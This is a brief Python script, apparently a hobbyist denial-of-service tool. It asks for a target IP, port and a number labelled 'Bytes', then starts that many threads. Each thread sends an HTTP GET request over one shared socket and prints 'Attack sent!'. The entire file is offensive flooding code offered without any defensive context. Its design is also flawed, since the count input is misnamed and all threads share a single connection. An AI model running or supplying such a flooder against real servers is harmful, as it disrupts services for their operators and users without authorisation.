import socket
import threading

ip = socket.gethostbyname(input("IP: "))
port = int(input("Port: "))
byte_s = int(input("Bytes: "))

sock = socket.socket()
sock.connect((ip, port))


def s_send():
    request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n"
    sock.sendall(request.encode())

    if sock.recv(1024):
        print(f"\033[32m[+]\033[0m Attack sent!")


for i in range(byte_s):
    thread = threading.Thread(target=s_send)
    thread.start()
